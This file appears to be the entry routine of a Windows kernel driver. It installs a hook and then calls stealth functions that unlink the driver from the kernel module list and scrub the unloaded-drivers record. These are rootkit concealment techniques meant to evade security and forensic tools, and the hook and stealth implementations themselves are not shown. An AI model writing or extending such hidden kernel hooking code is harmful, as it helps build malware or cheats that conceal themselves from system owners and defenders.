#include "global.h"
#include "hook.h"
#include "utils.h"
#include "stealth.h"

extern "C" NTSTATUS Entry(PDRIVER_OBJECT self, PUNICODE_STRING reg) {
    UNREFERENCED_PARAMETER(reg);

    NTSTATUS st = Utils::LoadKey(&Hook::generatedKey);
    if (!NT_SUCCESS(st) || !Hook::generatedKey.ready) {
        st = Utils::GenerateRandomKey(&Hook::generatedKey);
        if (!NT_SUCCESS(st)) return st;
        Utils::SaveKey(&Hook::generatedKey);
    }

    st = Hook::Install(self);
    if (!NT_SUCCESS(st)) return st;

    Stealth::UnlinkFromModuleList(self);
    Stealth::ScrubUnloadedDrivers();
    return STATUS_SUCCESS;
}
